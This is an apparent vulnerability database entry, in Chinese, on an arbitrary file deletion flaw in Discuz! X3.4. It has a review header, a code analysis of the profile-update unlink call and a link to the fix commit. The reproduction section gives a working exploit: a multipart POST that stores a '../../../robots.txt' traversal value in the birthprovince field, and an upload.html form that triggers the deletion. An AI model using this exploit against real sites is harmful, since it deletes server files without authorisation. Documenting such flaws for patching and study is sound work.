---
source: "hatch 补库批 20260928"
product: "Discuz X"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz! X3.4 任意文件删除漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：<=3.4 pre-fix builds; registered user/formhash; profile string stored then upload replaces field; filesystem deletion permissions"
side_effects: "未执行；本文需注意的操作影响：External upload.html depends on browser sending session cookie across origin; raw same-origin second request more reproducible"
source_status: "unknown"
id: "vw-63f03b52e6b879d7290959b4"
entity_id: "ve-63f03b52e6b879d7290959b4"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=3.4 pre-fix builds; registered user/formhash; profile string stored then upload replaces field; filesystem deletion permissions

- **事实待核（1）**：Detailed two-stage flow and exact patch commit strong evidence。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：&lt;=3.4 requires patch-date/commit cutoff; same version patched later。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（3）**：External upload.html depends on browser sending session cookie across origin; raw same-origin second request more reproducible。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **来源与引用处置（4）**：Image proof unviewed; no unrelated entity contamination。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz! X3.4 任意文件删除漏洞

一、漏洞简介
------------

二、漏洞影响
------------

影响版本：Discuz!x ≤3.4

三、复现过程
------------

### 漏洞分析

Discuz!X的码云已经更新修复了该漏洞

https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574

核心问题在`upload/source/include/spacecp/spacecp_profile.php`

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId25.png)

跟入代码70行

    if(submitcheck('profilesubmit')) {

当提交profilesubmit时进入判断，跟入177行

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId26.png)

我们发现如果满足配置文件中某个formtype的类型为file，我们就可以进入判断逻辑，这里我们尝试把配置输出出来看看

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId27.png)

我们发现formtype字段和条件不符，这里代码的逻辑已经走不进去了

我们接着看这次修复的改动，可以发现228行再次引入语句unlink

    @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);

回溯进入条件

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId28.png)

当上传文件并上传成功，即可进入unlink语句

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId29.png)

然后回溯变量`$space[$key]`,不难发现这就是用户的个人设置。

只要找到一个可以控制的变量即可，这里选择了birthprovince。

在设置页面直接提交就可以绕过字段内容的限制了。

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId30.png)

成功实现了任意文件删除

### 漏洞复现

访问`http://your-ip/robots.txt`可见robots.txt是存在的：

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId32.png)

注册用户后，在个人设置页面找到自己的formhash：

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId33.png)

带上自己的Cookie、formhash发送如下数据包：

    POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
    Host: localhost
    Content-Length: 367
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
    Cookie: [your cookie]
    Connection: close

    ------WebKitFormBoundaryPFvXyxL45f34L12s
    Content-Disposition: form-data; name="formhash"

    [your formhash]
    ------WebKitFormBoundaryPFvXyxL45f34L12s
    Content-Disposition: form-data; name="birthprovince"

    ../../../robots.txt
    ------WebKitFormBoundaryPFvXyxL45f34L12s
    Content-Disposition: form-data; name="profilesubmit"

    1
    ------WebKitFormBoundaryPFvXyxL45f34L12s--

提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId34.png)

说明我们的脏数据已经进入数据库了。

然后，新建一个`upload.html`，代码如下，将其中的`[your-ip]`改成discuz的域名，`[form-hash]`改成你的formhash：

    <body>
        <form action="http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
            <input type="file" name="birthprovince" />
            <input type="submit" value="upload" />
        </form>
    </body>

用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。

再次访问`http://your-ip/robots.txt`，发现文件成功被删除：

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId35.png)
